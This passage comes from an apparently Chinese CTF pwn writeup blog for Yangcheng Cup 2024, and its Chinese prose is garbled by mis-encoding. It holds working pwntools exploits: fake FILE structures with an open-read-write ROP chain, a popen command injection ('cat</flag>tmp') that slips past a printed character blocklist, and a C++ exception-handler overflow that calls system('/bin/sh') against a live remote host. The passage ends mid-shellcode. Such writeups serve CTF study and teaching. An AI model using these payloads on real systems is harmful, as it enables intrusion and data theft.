class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_write = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>], <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = fake_io_write.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_io_read.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>)</span><br><span class="line">target = stack - <span class="number">712</span> + <span class="number">8</span></span><br><span class="line">lg(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target + <span class="number">0x200</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000016333a</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x00000000000904a9</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000091316</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rdi_ret, target + <span class="number">0xc0</span>,</span><br><span class="line">    pop_rsi_ret, <span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">3</span>,</span><br><span class="line">    pop_rsi_ret, target + <span class="number">0x150</span>,</span><br><span class="line">    pop_rdx_rbx_ret, <span class="number">0x30</span>,<span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line">    <span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h3><p>è¿™é¢˜å®ç°äº†ä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œå…¶åŠŸèƒ½æ˜¯å¯¹getè¯·æ±‚çš„è·¯å¾„è¿›è¡Œè®¿é—®ï¼Œå¦‚æœè·¯å¾„ä»¥åŠæ–‡ä»¶åˆæ³•å°±ä¼šæ‰“å°å‡ºæ–‡ä»¶çš„å†…å®¹</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç¨‹åºå¯¹æˆ‘ä»¬è¾“å…¥çš„è·¯å¾„è¿›è¡Œäº†ååˆ†ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥è·å–<code>/flag</code>çš„å†…å®¹ï¼Œå› ä¸ºä¼šç»™è¿‡æ»¤æ‰ï¼Œå¯æ˜¯æˆ‘æ³¨æ„åˆ°äº†ä¸‹é¢æœ‰ä¸ª<code>popen</code>å‡½æ•°<br>å‡½æ•°çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">FILE * <span class="title function_">popen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command , <span class="type">const</span> <span class="type">char</span> *type )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pclose</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure><p>å‡½æ•°è¯´æ˜ï¼š</p><blockquote><p>popen()å‡½æ•°é€šè¿‡åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œè°ƒç”¨fork()äº§ç”Ÿä¸€ä¸ªå­è¿›ç¨‹ï¼Œæ‰§è¡Œä¸€ä¸ªshellä»¥è¿è¡Œå‘½ä»¤æ¥å¼€å¯ä¸€ä¸ªè¿›ç¨‹ã€‚è¿™ä¸ªç®¡é“å¿…é¡»ç”±pclose()å‡½æ•°å…³é—­ï¼Œè€Œä¸æ˜¯fclose()å‡½æ•°ã€‚pclose()å‡½æ•°å…³é—­æ ‡å‡†I&#x2F;Oæµï¼Œç­‰å¾…å‘½ä»¤æ‰§è¡Œç»“æŸï¼Œç„¶åè¿”å›shellçš„ç»ˆæ­¢çŠ¶æ€ã€‚å¦‚æœshellä¸èƒ½è¢«æ‰§è¡Œï¼Œåˆ™pclose()è¿”å›çš„ç»ˆæ­¢çŠ¶æ€ä¸shellå·²æ‰§è¡Œexitä¸€æ ·ã€‚<br>typeå‚æ•°åªèƒ½æ˜¯è¯»æˆ–è€…å†™ä¸­çš„ä¸€ç§ï¼Œå¾—åˆ°çš„è¿”å›å€¼ï¼ˆæ ‡å‡†I&#x2F;Oæµï¼‰ä¹Ÿå…·æœ‰å’Œtypeç›¸åº”çš„åªè¯»æˆ–åªå†™ç±»å‹ã€‚å¦‚æœtypeæ˜¯â€râ€åˆ™æ–‡ä»¶æŒ‡é’ˆè¿æ¥åˆ°commandçš„æ ‡å‡†è¾“å‡ºï¼›å¦‚æœtypeæ˜¯â€wâ€åˆ™æ–‡ä»¶æŒ‡é’ˆè¿æ¥åˆ°commandçš„æ ‡å‡†è¾“å…¥ã€‚<br>commandå‚æ•°æ˜¯ä¸€ä¸ªæŒ‡å‘ä»¥NULLç»“æŸçš„shellå‘½ä»¤å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚è¿™è¡Œå‘½ä»¤å°†è¢«ä¼ åˆ°bin&#x2F;shå¹¶ä½¿ç”¨-cæ ‡å¿—ï¼Œshellå°†æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ã€‚<br>popen()çš„è¿”å›å€¼æ˜¯ä¸ªæ ‡å‡†I&#x2F;Oæµï¼Œå¿…é¡»ç”±pcloseæ¥ç»ˆæ­¢ã€‚å‰é¢æåˆ°è¿™ä¸ªæµæ˜¯å•å‘çš„ï¼ˆåªèƒ½ç”¨äºè¯»æˆ–å†™ï¼‰ã€‚å‘è¿™ä¸ªæµå†™å†…å®¹ç›¸å½“äºå†™å…¥è¯¥å‘½ä»¤çš„æ ‡å‡†è¾“å…¥ï¼Œå‘½ä»¤çš„æ ‡å‡†è¾“å‡ºå’Œè°ƒç”¨popen()çš„è¿›ç¨‹ç›¸åŒï¼›ä¸ä¹‹ç›¸åçš„ï¼Œä»æµä¸­è¯»æ•°æ®ç›¸å½“äºè¯»å–å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºï¼Œå‘½ä»¤çš„æ ‡å‡†è¾“å…¥å’Œè°ƒç”¨popen()çš„è¿›ç¨‹ç›¸åŒã€‚</p></blockquote><p>å‡½æ•°ä½œç”¨ï¼š</p><blockquote><p>popenå‡½æ•°å…è®¸ä¸€ä¸ªç¨‹åºå°†å¦å¤–ä¸€ä¸ªç¨‹åºä½œä¸ºæ–°è¿›ç¨‹æ¥å¯åŠ¨ï¼Œå¹¶å¯ä»¥ä¼ é€’æ•°æ®æˆ–è€…é€šè¿‡å®ƒæ¥å—æ•°æ®ã€‚<br>å…¶å†…éƒ¨å®ç°ä¸ºè°ƒç”¨ fork äº§ç”Ÿä¸€ä¸ªå­è¿›ç¨‹ï¼Œæ‰§è¡Œä¸€ä¸ª shellï¼Œ ä»¥è¿è¡Œå‘½ä»¤æ¥å¼€å¯ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹å¿…é¡»ç”± pclose() å‡½æ•°å…³é—­ã€‚</p></blockquote><p>è¿™ä¹ˆè¯´<code>popen</code>å‡½æ•°å°±ç±»ä¼¼äº<code>system</code>å‡½æ•°å¯ä»¥è®©æˆ‘ä»¬è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œå¯æ˜¯ç¨‹åºå¯¹æˆ‘ä»¬è¾“å…¥çš„è·¯å¾„è¿˜è¿›è¡Œäº†ç¬¬äºŒå±‚è¿‡æ»¤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">sub_1F74</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> needle[<span class="number">3</span>]; <span class="comment">// [esp+15h] [ebp-13h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(needle, <span class="string">&quot;sh&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;bin&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">38</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">124</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">59</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">36</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">123</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">125</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">96</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, needle) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strstr</span>(a1, v3) == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != __readgsdword(<span class="number">0x14</span>u) )</span><br><span class="line">    sub_2A70();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä½¿ç”¨<code>/bin/sh</code>æ¥èµ·shelläº†ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿä¸èƒ½ç›´æ¥<code>cat flag</code>ï¼Œå› ä¸ºè¿™ä¸­é—´æœ‰ç©ºæ ¼ï¼Œä¼šå¯¼è‡´ç¨‹åºåˆ¤æ–­æˆ‘ä»¬çš„getè¯·æ±‚æ ¼å¼é”™è¯¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆå°†&#x2F;flagçš„å†…å®¹ä¿å­˜åˆ°å½“å‰ç›®å½•ä¸‹çš„tmpæ–‡ä»¶ä¸­ï¼Œç„¶åå†è¯»å–è¯¥tmpæ–‡ä»¶æ¥è·å–flag<br>è½¬ç§»flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&#x27;cat&lt;/flag&gt;tmp&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;get /&#123;&#125; HTTP/1.0\r&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(path).encode()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Host: 256.256.256.256\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Content-Length: 1\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><p>è¯»å–flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&#x27;./tmp&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;get /&#123;&#125; HTTP/1.0\r&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(path).encode()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Host: 256.256.256.256\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Content-Length: 1\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h3 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h3><p>è¿™é“é¢˜ç›®æ‰“çš„æ˜¯<code>C++</code>ä¸­çš„å¼‚å¸¸å¤„ç†ï¼Œå­˜åœ¨ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œå¯æ˜¯å¼€å¯äº†<code>canary</code>ï¼Œéœ€è¦ç”¨å¼‚å¸¸å¤„ç†æ¥ç»•è¿‡</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™é‡Œæˆ‘ä¸€å¼€å§‹æƒ³çš„æ˜¯æ‰“ <code>CHOP</code>ï¼Œå¯æ˜¯é™„ä»¶é‡Œå¹¶æ²¡æœ‰ç»™å„ç§ä¾èµ–ï¼Œç„¶åæˆ‘å‘ç°äº†ä¸‹é¢è¿™ä¸ªä¸œä¸œ</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¥½å®¶ä¼™ï¼Œè¿™ä¸æ˜¯ç›´æ¥é€æˆ‘ä¸ª<code>system</code>å‡½æ•°å—ã€‚ç»è¿‡è°ƒè¯•ï¼Œè¿™ä¸ªåœ°æ–¹æ‰§è¡Œæ—¶<code>rdi</code>çš„å€¼ä¸€ç›´ä¸º<code>0x4040A0</code></p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™ä¸ªåœ°æ–¹å­˜å‚¨äº†ä¸€ä¸ªç”¨æ¥æŠ¥é”™çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ä¸Šé¢æœ‰ä¸€ä¸ªæ•°ç»„ï¼Œè¯¥ç¨‹åºå­˜åœ¨ä¸€ä¸ªè¯¥æ•°ç»„çš„è¶Šç•Œå†™</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å½“ç´¢å¼•ä¸º8æ—¶æˆ‘ä»¬å°±èƒ½åœ¨<code>0x4040A0</code>ä¸Šå†™æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™<code>/bin/sh</code>ï¼Œç„¶ååˆ©ç”¨<code>catch</code>ä¸­çš„<code>system</code>æ¥ç›´æ¥getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">34689</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your chocie:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">rop = <span class="number">0x404200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;You can record log details here:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Do you need to check the records?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[!] Type your message here plz:&#x27;</span>)</span><br><span class="line">payload = p64(rop+<span class="number">0x10</span>)*<span class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+p64(rop)*((<span class="number">0x70</span>//<span class="number">8</span>)-<span class="number">5</span>)+p64(rop+<span class="number">0x20</span>)+p64(<span class="number">0x401BC7</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="sandbox-after-competition"><a href="#sandbox-after-competition" class="headerlink" title="sandbox(after competition)"></a>sandbox(after competition)</h3><p>è¿™é¢˜æ˜¯æœ€æŠ½è±¡çš„ï¼Œæœ¬åœ°é€šå¯æ˜¯è¿œç¨‹ä¸é€šğŸ˜°ğŸ˜°ğŸ˜°ğŸ˜°ğŸ˜°ğŸ˜°<br>å…¸å‹çš„èœå•é¢˜ï¼Œç”³è¯·çš„å †å—å¤§å°åªè®¿é—®äº†<code>0x500-0x1000</code>ï¼Œ<code>delete</code>å‡½æ•°å­˜åœ¨æ˜æ˜¾çš„ <code>UAF</code> </p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ‰€ä»¥ç›´æ¥<code>larginbin attack</code>æ‰“<code>_IO_list_all</code>å³å¯ï¼Œå¯æ˜¯è¿™åªæ˜¯æ¶æ¢¦çš„å¼€å§‹ï¼Œè¿™é¢˜å¼€å¯äº†æ²™ç®±</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹åˆ°ç¨‹åºå§<code>open</code>å’Œ<code>openat</code>ç»™banäº†ï¼Œäºæ˜¯æˆ‘é©¬ä¸Šæƒ³åˆ°äº†<code>openat2</code>ï¼Œ<code>shellcode</code> å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span 